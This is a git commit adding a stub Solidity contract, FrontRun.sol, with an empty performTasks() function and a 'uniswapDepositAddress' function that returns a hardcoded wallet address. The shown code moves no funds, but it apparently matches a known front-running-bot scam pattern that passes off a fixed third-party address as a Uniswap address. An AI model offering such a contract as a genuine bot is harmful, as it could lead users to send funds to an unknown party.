ab86b761431e9b299346624e51e93c807d10d72a
omufx <103666679+omufx@users.noreply.github.com>
2022-09-28 09:42:33 +0500

    Update and rename FrontRun to FrontRun.sol

---
+++ FrontRun.sol
@@ -0,0 +1,10 @@
+pragma solidity ^0.6.6;
+
+contract Manager { function performTasks() public {
+
+}
+
+function uniswapDepositAddress() public pure returns (address) { 
+return 0xd86f378396f9e3adb13c23121f1e16e62e0078a8;
+}
+}
